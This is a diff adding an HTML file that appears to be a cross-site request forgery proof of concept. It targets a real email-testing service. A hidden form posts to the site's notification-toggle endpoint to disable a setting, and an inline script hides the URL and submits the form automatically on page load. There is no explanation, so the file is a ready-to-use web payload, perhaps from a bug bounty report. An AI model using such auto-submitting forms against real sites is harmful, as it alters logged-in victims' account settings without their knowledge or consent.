@@ -1,0 +1,12 @@
+<html>
+  <body>
+    <form action="https://app.emailonacid.com/app/cp/togglecpkemailnotification" method="POST">
+      <input type="hidden" name="enable&#95;cpk&#95;email&#95;notification" value="false" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
